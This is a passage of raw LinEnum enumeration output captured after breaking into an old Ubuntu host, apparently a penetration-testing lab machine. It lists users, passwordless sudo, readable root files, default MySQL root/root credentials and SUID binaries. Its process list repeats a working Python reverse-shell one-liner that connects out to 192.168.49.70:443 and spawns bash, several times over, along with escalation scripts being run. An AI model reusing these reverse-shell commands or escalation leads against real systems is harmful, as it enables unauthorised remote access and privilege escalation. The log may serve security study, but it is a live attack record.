klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash


[-] Super user account(s):
root


[+] We can sudo without supplying a password!
usage: sudo [-HPSb] [-p prompt] [-u username|#uid]
            { -e file [...] | -i | -s | <command> }


[+] Possible sudo pwnage!
file


[+] We can read root's home directory!
total 28K
drwxr-xr-x  3 root root 4.0K Jan 22 23:40 .
drwxr-xr-x 21 root root 4.0K Apr 24  2008 ..
-rw-------  1 root root    0 Sep  3  2020 .bash_history
-rw-r--r--  1 root root 2.4K Apr 19  2016 .bashrc
-rw-r--r--  1 root root  141 May 15  2007 .profile
drwxr-xr-x  2 root root 4.0K Sep 24  2008 .ssh
-rw-r--r--  1 root root 2.3K Mar 30  2017 capture.cap
----------  1 root root   33 Jan 22 23:40 proof.txt


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root    root    4.0K Apr 12  2016 .
drwxr-xr-x 21 root    root    4.0K Apr 24  2008 ..
drwxr-xr-x  2 patrick patrick 4.0K Mar 25  2020 patrick


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/tmp
LANG=C
SHLVL=2
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/bin:/bin
drwxr-xr-x 2 root root  4096 Apr 24  2008 /bin
drwxr-xr-x 2 root root 20480 Jan 17  2018 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 24  2008 /usr/local/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/csh
/bin/sh
/usr/bin/es
/usr/bin/ksh
/bin/ksh
/usr/bin/rc
/usr/bin/tcsh
/bin/tcsh
/usr/bin/esh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
u=rwx,g=rx,o=rx
0022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  724 Dec 20  2006 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rw-r--r--  1 root root  456 Oct  4  2007 php5

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  633 Oct  4  2007 apache2
-rwxr-xr-x  1 root root 5811 Oct 15  2007 apt
-rwxr-xr-x  1 root root  314 Sep 15  2007 aptitude
-rwxr-xr-x  1 root root  502 May 15  2007 bsdmainutils
-rwxr-xr-x  1 root root  473 Oct  3  2007 find
-rwxr-xr-x  1 root root   89 Jun 19  2006 logrotate
-rwxr-xr-x  1 root root  946 May 23  2007 man-db
-rwxr-xr-x  1 root root  383 Oct  4  2007 samba
-rwxr-xr-x  1 root root 3283 Dec 20  2006 standard
-rwxr-xr-x  1 root root 1309 Sep 17  2007 sysklogd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  129 Dec 20  2006 standard

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Apr 24  2008 .
drwxr-xr-x 70 root root 4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
-rwxr-xr-x  1 root root  520 May 23  2007 man-db
-rwxr-xr-x  1 root root 1942 May 15  2007 popularity-contest
-rwxr-xr-x  1 root root 1220 Sep 17  2007 sysklogd


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:50:56:BA:FA:AE  
          inet addr:192.168.70.39  Bcast:192.168.70.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:faae/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:473789 errors:24 dropped:24 overruns:0 frame:0
          TX packets:465555 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:64718418 (61.7 MB)  TX bytes:213818225 (203.9 MB)
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:498 errors:0 dropped:0 overruns:0 frame:0
          TX packets:498 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1248045 (1.1 MB)  TX bytes:1248045 (1.1 MB)


[-] ARP history:
192.168.70.254 dev eth0 lladdr 00:50:56:ba:42:59 REACHABLE


[-] Nameserver(s):
nameserver 192.168.70.254


[-] Default route:
default via 192.168.70.254 dev eth0  metric 100 


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     -                   
tcp6       0      0 :::80                   :::*                    LISTEN     6293/sh             
tcp6       0      0 :::22                   :::*                    LISTEN     -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3   2952  1856 ?        Ss   Jan22   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   Jan22   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        SN   Jan22   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Jan22   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   Jan22   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S<   Jan22   0:00 [khelper]
root        26  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kblockd/0]
root        27  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kacpid]
root        28  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kacpi_notify]
root       181  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kseriod]
root       205  0.0  0.0      0     0 ?        S    Jan22   0:00 [pdflush]
root       206  0.0  0.0      0     0 ?        S    Jan22   0:00 [pdflush]
root       207  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kswapd0]
root       259  0.0  0.0      0     0 ?        S<   Jan22   0:00 [aio/0]
root      1997  0.0  0.0      0     0 ?        S<   Jan22   0:00 [ata/0]
root      1998  0.0  0.0      0     0 ?        S<   Jan22   0:00 [ata_aux]
root      2000  0.0  0.0      0     0 ?        S<   Jan22   0:00 [scsi_eh_0]
root      2001  0.0  0.0      0     0 ?        S<   Jan22   0:00 [scsi_eh_1]
root      2281  0.0  0.0      0     0 ?        S<   Jan22   0:00 [scsi_eh_2]
root      2475  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kjournald]
root      2634  0.0  0.1   2332   748 ?        S<s  Jan22   0:00 /sbin/udevd --daemon
root      3651  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kpsmoused]
root      4124  0.0  0.9  17824  4820 ?        Sl   Jan22   0:00 /usr/sbin/vmtoolsd
root      4169  0.0  1.4  13768  7676 ?        S    Jan22   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root      4392  0.0  0.0   1692   512 tty4     Ss+  Jan22   0:00 /sbin/getty 38400 tty4
root      4393  0.0  0.1   1692   516 tty5     Ss+  Jan22   0:00 /sbin/getty 38400 tty5
root      4396  0.0  0.1   1692   516 tty2     Ss+  Jan22   0:00 /sbin/getty 38400 tty2
root      4399  0.0  0.1   1692   516 tty3     Ss+  Jan22   0:00 /sbin/getty 38400 tty3
root      4402  0.0  0.1   1692   516 tty1     Ss+  Jan22   0:00 /sbin/getty 38400 tty1
root      4403  0.0  0.1   1696   516 tty6     Ss+  Jan22   0:00 /sbin/getty 38400 tty6
syslog    4442  0.0  0.1   1916   700 ?        Ss   Jan22   0:00 /sbin/syslogd -u syslog
root      4461  0.0  0.1   1840   536 ?        S    Jan22   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      4463  0.0  0.2   2504  1412 ?        Ss   Jan22   0:00 /sbin/klogd -P /var/run/klogd/kmsg
root      4542  0.0  0.1   1752   524 ?        S    Jan22   0:00 /bin/sh /usr/bin/mysqld_safe
mysql     4582  0.0  3.6 129480 18620 ?        Sl   Jan22   0:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root      4583  0.0  0.1   1680   552 ?        S    Jan22   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root      4657  0.0  0.4   9904  2280 ?        Ss   Jan22   0:00 /usr/sbin/smbd -D
root      4671  0.0  0.2   7988  1380 ?        Ss   Jan22   0:00 /usr/sbin/winbindd
root      4689  0.0  0.3   8112  1724 ?        S    Jan22   0:00 /usr/sbin/winbindd
root      4694  0.0  0.1   2048   676 ?        Ss   Jan22   0:00 /usr/sbin/dovecot
root      4700  0.0  0.5   9600  2740 ?        S    Jan22   0:00 dovecot-auth
daemon    4709  0.0  0.0   1960   428 ?        Ss   Jan22   0:00 /usr/sbin/atd
root      4720  0.0  0.1   2332   912 ?        Ss   Jan22   0:00 /usr/sbin/cron
root      4727  0.0  0.2   7996  1296 ?        S    Jan22   0:00 /usr/sbin/winbindd
root      4738  0.0  0.1   7988   880 ?        S    Jan22   0:00 /usr/sbin/winbindd
root      4739  0.0  0.1   9904   916 ?        S    Jan22   0:00 /usr/sbin/smbd -D
root      4751  0.0  1.2  21568  6224 ?        Ss   Jan22   0:00 /usr/sbin/apache2 -k start
root      4922  0.0  0.1   5280   992 ?        Ss   Jan22   0:00 /usr/sbin/sshd
www-data  4937  0.0  1.6  23872  8716 ?        S    Jan22   0:03 /usr/sbin/apache2 -k start
www-data  5242  0.0  1.7  23872  8784 ?        S    Jan22   0:06 /usr/sbin/apache2 -k start
www-data  5267  0.0  2.0  26012 10780 ?        S    Jan22   0:03 /usr/sbin/apache2 -k start
www-data  5293  0.0  1.9  25404 10148 ?        S    Jan22   0:03 /usr/sbin/apache2 -k start
www-data  5294  0.0  1.8  24868  9708 ?        S    Jan22   0:04 /usr/sbin/apache2 -k start
www-data  5298  0.0  1.7  23896  9104 ?        S    Jan22   0:02 /usr/sbin/apache2 -k start
dovecot   5442  0.0  0.2   3464  1540 ?        S    Jan22   0:00 pop3-login
dovecot   5443  0.0  0.2   3464  1540 ?        S    Jan22   0:00 pop3-login
www-data  5752  0.0  1.7  24112  9112 ?        S    Jan22   0:05 /usr/sbin/apache2 -k start
www-data  6205  0.0  1.7  24120  8956 ?        S    00:06   0:02 /usr/sbin/apache2 -k start
dovecot   6238  0.0  0.2   3464  1536 ?        S    00:07   0:00 imap-login
dovecot   6239  0.0  0.2   3468  1540 ?        S    00:07   0:00 imap-login
dovecot   6245  0.0  0.2   3464  1540 ?        S    00:07   0:00 pop3-login
dovecot   6246  0.0  0.2   3468  1540 ?        S    00:07   0:00 imap-login
www-data  6257  0.0  1.7  23880  8928 ?        S    00:22   0:01 /usr/sbin/apache2 -k start
www-data  6258  0.0  0.9  21568  4840 ?        S    00:36   0:01 /usr/sbin/apache2 -k start
www-data  6259  0.0  0.9  21568  4980 ?        S    00:36   0:01 /usr/sbin/apache2 -k start
www-data  6260  0.0  0.9  21568  4840 ?        S    00:36   0:00 /usr/sbin/apache2 -k start
www-data  6261  0.0  1.6  23852  8424 ?        S    00:36   0:00 /usr/sbin/apache2 -k start
www-data  6274  0.0  0.7  21568  3860 ?        S    00:50   0:00 /usr/sbin/apache2 -k start
www-data  6278  0.0  0.7  21568  3860 ?        S    00:50   0:00 /usr/sbin/apache2 -k start
www-data  6280  0.0  0.7  21568  3848 ?        S    00:52   0:00 /usr/sbin/apache2 -k start
www-data  6293  0.0  0.0   1756   492 ?        S    00:57   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data  6294 23.5  0.7   6240  3652 ?        R    00:57  12:50 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data  6295  0.0  0.3   3392  1808 pts/0    Ss   00:57   0:00 /bin/bash
www-data  6305  0.0  0.7  21568  3856 ?        S    00:58   0:00 /usr/sbin/apache2 -k start
www-data  6311  0.0  0.1   1752   608 pts/0    S+   00:59   0:00 /bin/sh ./lse.sh
www-data  6346  0.0  0.0      0     0 pts/0    Z+   00:59   0:00 [lse.sh] <defunct>
www-data  6352  0.0  0.0      0     0 pts/0    Z+   00:59   0:00 [rm] <defunct>
www-data  7905  0.0  0.0   1752   400 pts/0    S+   00:59   0:00 /bin/sh ./lse.sh
www-data 12671  0.0  0.0   1756   492 ?        S    01:06   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 12672 15.9  0.7   6252  3660 ?        R    01:06   7:20 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 12673  0.0  0.3   3408  1832 pts/1    Ss+  01:06   0:00 /bin/bash
www-data 12698  0.0  0.7  21568  3856 ?        S    01:06   0:00 /usr/sbin/apache2 -k start
www-data 13452  0.0  0.0   1756   492 ?        S    01:18   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 13453  0.0  0.7   6240  3652 ?        S    01:18   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 13462  0.0  0.7  21568  3856 ?        S    01:19   0:00 /usr/sbin/apache2 -k start
www-data 13464  0.0  0.3   3408  1836 pts/2    Ss   01:19   0:00 /bin/bash
www-data 13468  0.0  0.9  21568  4812 ?        S    01:19   0:00 /usr/sbin/apache2 -k start
www-data 13469  0.0  0.9  21568  4916 ?        S    01:19   0:00 /usr/sbin/apache2 -k start
www-data 14618  0.0  0.7  21568  3848 ?        S    01:38   0:00 /usr/sbin/apache2 -k start
www-data 14718  0.0  0.0   1756   492 ?        S    01:39   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 14719  0.0  0.7   6244  3656 ?        S    01:39   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 14720  0.0  0.3   3388  1804 pts/3    Ss+  01:39   0:00 /bin/bash
www-data 15476  0.0  0.3   3228  1704 pts/2    S+   01:52   0:00 /bin/bash ./linenum.sh
www-data 15477  0.1  0.2   3760  1500 pts/2    R+   01:52   0:00 /bin/bash ./linenum.sh
www-data 15479  0.0  0.0   1684   428 pts/2    S+   01:52   0:00 tee -a
www-data 15654  0.0  0.0   1676   416 pts/0    S+   01:52   0:00 sleep 1
www-data 15679  0.0  0.2   3760  1320 pts/2    R+   01:52   0:00 /bin/bash ./linenum.sh
www-data 15680  0.0  0.1   2344   928 pts/2    R+   01:52   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  701680 Oct  5  2007 /bin/bash
-rwxr-xr-x 1 root root   38780 Sep 29  2007 /bin/dd
lrwxrwxrwx 1 root root       4 Apr 24  2008 /bin/sh -> dash
-rwxr-xr-x 1 root root   15104 Oct  3  2007 /sbin/getty
-rwxr-xr-x 1 root root   88672 Sep 16  2007 /sbin/init
-rwxr-xr-x 1 root root   22948 Sep 17  2007 /sbin/klogd
-rwxr-xr-x 1 root root   31992 Sep 17  2007 /sbin/syslogd
-rwxr-xr-x 1 root root   65672 Oct  5  2007 /sbin/udevd
lrwxrwxrwx 1 root root      37 Jan 17  2018 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin32/appLoader
-rwxr-xr-x 1 root root  344876 Oct  4  2007 /usr/sbin/apache2
-rwxr-xr-x 1 root root   16040 Feb 20  2007 /usr/sbin/atd
-rwxr-xr-x 1 root root   32192 Dec 20  2006 /usr/sbin/cron
-rwxr-xr-x 1 root root  132652 Oct 15  2007 /usr/sbin/dovecot
-rwxr-xr-x 1 root root 7239668 Oct 12  2007 /usr/sbin/mysqld
-rwxr-xr-x 1 root root 3894524 Oct  4  2007 /usr/sbin/smbd
-rwxr-xr-x 1 root root  368036 Oct  4  2007 /usr/sbin/sshd
lrwxrwxrwx 1 root root      37 Jan 17  2018 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd
-rwxr-xr-x 1 root root 2592224 Oct  4  2007 /usr/sbin/winbindd


[-] Contents of /etc/inetd.conf:
#<off># netbios-ssn     stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/smbd


[-] The related inetd binary permissions:
-rwxr-xr-x 1 root root 4504 Jul 30  2007 /usr/sbin/tcpd


[-] /etc/init.d/ binary permissions:
total 376
drwxr-xr-x  2 root root  4096 Jan 17  2018 .
drwxr-xr-x 70 root root  4096 Jul 26 09:48 ..
-rw-r--r--  1 root root  1335 Oct  4  2007 README
-rwxr-xr-x  1 root root  9534 Sep  3  2007 alsa-utils
-rwxr-xr-x  1 root root  5936 Oct  4  2007 apache2
-rwxr-xr-x  1 root root  2793 Oct 14  2007 apparmor
-rwxr-xr-x  1 root root   969 Feb 20  2007 atd
-rwxr-xr-x  1 root root  3597 Oct  4  2007 bootclean
-rwxr-xr-x  1 root root  2121 Oct  4  2007 bootlogd
-rwxr-xr-x  1 root root  1768 Oct  4  2007 bootmisc.sh
-rwxr-xr-x  1 root root  2887 Oct  4  2007 checkfs.sh
-rwxr-xr-x  1 root root  9875 Oct  4  2007 checkroot.sh
-rwxr-xr-x  1 root root  6355 May 30  2007 console-screen.sh
-rwxr-xr-x  1 root root  1612 May  2  2007 console-setup
-rwxr-xr-x  1 root root  1761 Dec 20  2006 cron
-rwxr-xr-x  1 root root  1223 Jun 22  2007 dns-clean
-rwxr-xr-x  1 root root  5147 Oct 15  2007 dovecot
-rwxr-xr-x  1 root root  6607 Sep 30  2007 glibc.sh
-rwxr-xr-x  1 root root  1228 Oct  4  2007 halt
-rwxr-xr-x  1 root root  5137 Apr 21  2005 hdparm
-rwxr-xr-x  1 root root   909 Oct  4  2007 hostname.sh
-rwxr-xr-x  1 root root  4568 Oct  3  2007 hwclock.sh
-rwxr-xr-x  1 root root  4569 Oct  3  2007 hwclockfirst.sh
-rwxr-xr-x  1 root root  1304 Jun  2  2007 keyboard-setup
-rwxr-xr-x  1 root root   944 Oct  4  2007 killprocs
-rwxr-xr-x  1 root root  1752 Sep 17  2007 klogd
-rwxr-xr-x  1 root root   632 Jul 13  2007 libpam-foreground
-rwxr-xr-x  1 root root   748 Jan 23  2006 loopback
-rwxr-xr-x  1 root root  1050 Jul 28  2007 makedev
-rwxr-xr-x  1 root root  1399 Oct  5  2007 module-init-tools
-rwxr-xr-x  1 root root   596 Oct  4  2007 mountall-bootclean.sh
-rwxr-xr-x  1 root root  2430 Oct  4  2007 mountall.sh
-rwxr-xr-x  1 root root  1465 Oct  4  2007 mountdevsubfs.sh
-rwxr-xr-x  1 root root  1460 Oct  4  2007 mountkernfs.sh
-rwxr-xr-x  1 root root   594 Oct  4  2007 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root  1244 Oct  4  2007 mountoverflowtmp
-rwxr-xr-x  1 root root  2689 Oct  4  2007 mtab.sh
-rwxr-xr-x  1 root root  6127 Oct 12  2007 mysql
-rwxr-xr-x  1 root root  2547 Oct 12  2007 mysql-ndb
-rwxr-xr-x  1 root root  1931 Oct 12  2007 mysql-ndb-mgm
-rwxr-xr-x  1 root root  1772 May  8  2007 networking
-rwxr-xr-x  1 root root  2351 Mar  7  2007 pcmciautils
-rwxr-xr-x  1 root root  2975 Oct  5  2007 postfix
-rwxr-xr-x  1 root root   375 Oct  4  2007 pppd-dns
-rwxr-xr-x  1 root root  1208 Jul 31  2007 procps.sh
-rwxr-xr-x  1 root root  8191 Oct  4  2007 rc
-rwxr-xr-x  1 root root   522 Oct  4  2007 rc.local
-rwxr-xr-x  1 root root   117 Oct  4  2007 rcS
-rwxr-xr-x  1 root root   692 Oct  4  2007 reboot
-rwxr-xr-x  1 root root  1000 Oct  4  2007 rmnologin
-rwxr-xr-x  1 root root  4945 Aug 17  2007 rsync
-rwxr-xr-x  1 root root  2426 Oct  4  2007 samba
-rwxr-xr-x  1 root root   975 Oct  4  2007 sendsigs
-rwxr-xr-x  1 root root   585 Oct  4  2007 single
-rwxr-xr-x  1 root root  4215 Oct  4  2007 skeleton
-rwxr-xr-x  1 root root  3524 Oct  4  2007 ssh
-rwxr-xr-x  1 root root   510 Oct  4  2007 stop-bootlogd
-rwxr-xr-x  1 root root   647 Oct  4  2007 stop-bootlogd-single
-rwxr-xr-x  1 root root  3369 Sep 17  2007 sysklogd
-rwxr-xr-x  1 root root  2471 Oct  5  2007 udev
-rwxr-xr-x  1 root root   706 Oct  5  2007 udev-finish
-rwxr-xr-x  1 root root  3511 Oct  4  2007 umountfs
-rwxr-xr-x  1 root root  1833 Oct  4  2007 umountnfs.sh
-rwxr-xr-x  1 root root  1439 Oct  4  2007 umountroot
-rwxr-xr-x  1 root root  1815 Oct  4  2007 urandom
-rwxr-xr-x  1 root root 44447 Jan 17  2018 vmware-tools
-rwxr-xr-x  1 root root  1939 Oct  4  2007 waitnfs.sh
-rwxr-xr-x  1 root root  1224 Oct  4  2007 winbind
-rwxr-xr-x  1 root root  1626 Sep 24  2007 wpa-ifupdown


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.6.8p12


[-] MYSQL version:
mysql  Ver 14.12 Distrib 5.0.45, for pc-linux-gnu (i486) using readline 5.2


[+] We can connect to the local MYSQL service with default root/root credentials!
mysqladmin  Ver 8.41 Distrib 5.0.45, for pc-linux-gnu on i486
Copyright (C) 2000-2006 MySQL AB
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL license

Server version          5.0.45-Debian_1ubuntu3-log
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 180 days 17 hours 3 min 58 sec

Threads: 1  Questions: 53883  Slow queries: 0  Opens: 315  Flush tables: 1  Open tables: 64  Queries per second avg: 0.003


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1118 Apr 12  2016 /etc/passwd
-rw-r--r-- 1 root root 754 Apr 12  2016 /etc/group
-rw-r--r-- 1 root root 369 Apr 24  2008 /etc/profile
-rw-r----- 1 root shadow 761 Mar 24  2020 /etc/shadow


[-] SUID files:
-rwsr-xr-- 1 root dhcp 2956 Sep  7  2007 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 1 root root 9292 Oct  4  2007 /sbin/umount.cifs
-rwsr-xr-x 1 root root 22700 Oct  4  2007 /sbin/mount.cifs
-rwsr-xr-- 1 root fuse 19668 Sep 18  2007 /bin/fusermount
-rwsr-xr-x 1 root root 30856 Jul  6  2007 /bin/ping
-rwsr-xr-x 1 root root 26684 Jul  6  2007 /bin/ping6
-rwsr-xr-x 1 root root 3448 Aug  1  2007 /bin/check-foreground-console
-rwsr-xr-x 1 root root 61248 Oct  3  2007 /bin/umount
-rwsr-xr-x 1 root root 27140 May 18  2007 /bin/su
-rwsr-xr-x 1 root root 80568 Oct  3  2007 /bin/mount
-r-sr-xr-x 1 root root 14320 Jan 17  2018 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 9532 Jan 17  2018 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 168232 Oct  4  2007 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9624 Sep 30  2007 /usr/lib/pt_chown
-rwsr-xr-- 1 root www-data 10596 Oct  4  2007 /usr/lib/apache2/suexec
-rwsr-xr-x 1 root root 4536 Jun 14  2007 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root dip 269256 Oct  4  2007 /usr/sbin/pppd
-rwsr-xr-x 1 root root 23920 May 18  2007 /usr/bin/chsh
-rwsr-xr-x 1 root root 46052 May 30  2007 /usr/bin/mtr
-rwsr-xr-x 1 root root 11076 Jul  6  2007 /usr/bin/arping
-rwsr-xr-x 1 root root 12392 Jul  6  2007 /usr/bin/traceroute6.iputils
-rwsr-xr-x 2 root root 91776 Jun 15  2007 /usr/bin/sudo
-rwsr-xr-x 1 root root 29104 May 18  2007 /usr/bin/passwd
-rwsr-sr-x 1 root mail 72316 Mar 27  2007 /usr/bin/procmail
-rwsr-xr-x 1 root root 37392 May 18  2007 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 9904 Oct  4  2007 /usr/bin/smbmnt
-rwsr-xr-x 1 root root 20456 May 18  2007 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 38464 Feb 20  2007 /usr/bin/at
-rwsr-xr-x 2 root root 91776 Jun 15  2007 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 32208 May 18  2007 /usr/bin/chfn
-rwsr-sr-x 1 root root 6516 Oct  4  2007 /usr/bin/smbumount
-rwsr-xr-x 1 www-data www-data 29104 Jan 23 01:45 /tmp/bak


[+] Possibly interesting SUID files:
-rwsr-xr-- 1 root dhcp 2956 Sep  7  2007 /lib/dhcp3-client/call-dhclient-script


[-] SGID files:
-rwxr-sr-x 1 root shadow 21216 Oct  1  2007 /sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 10688 Jun  7  2007 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 9960 Oct  3  2007 /usr/bin/wall
-rwsr-sr-x 1 root mail 72316 Mar 27  2007 /usr/bin/procmail
-rwxr-sr-x 1 root shadow 38128 May 18  2007 /usr/bin/chage
-rwxr-sr-x 1 root tty 7836 May 15  2007 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 80688 Oct  4  2007 /usr/bin/ssh-agent
-rwsr-sr-x 1 daemon daemon 38464 Feb 20  2007 /usr/bin/at
-rwxr-sr-x 1 root mail 12832 Mar 27  2007 /usr/bin/lockfile
-rwsr-sr-x 1 root root 6516 Oct  4  2007 /usr/bin/smbumount
-rwxr-sr-x 1 root shadow 18664 May 18  2007 /usr/bin/expiry
